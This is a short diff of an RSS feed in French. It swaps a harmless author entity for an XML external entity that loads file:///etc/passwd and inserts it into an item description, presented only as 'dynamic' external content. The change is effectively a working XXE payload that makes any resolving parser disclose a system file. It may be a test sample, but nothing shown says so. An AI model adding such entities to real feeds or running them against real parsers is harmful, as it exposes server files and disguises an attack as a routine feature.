@@ -1,18 +1,18 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-  <!ENTITY author "John Doe">
+  <!ENTITY article SYSTEM "file:///etc/passwd">
 ]>
 <rss version="2.0">
   <channel>
-    <title>Exemple de flux RSS</title>
+    <title>Flux RSS dynamique</title>
     <link>https://example.com</link>
-    <description>Flux RSS avec entité XML</description>
+    <description>Flux RSS avec contenu externe</description>
 
     <item>
-      <title>Premier article</title>
+      <title>Article dynamique</title>
       <link>https://example.com/article-1</link>
       <description>
-        Article écrit par &author;
+        &article;
       </description>
     </item>
 
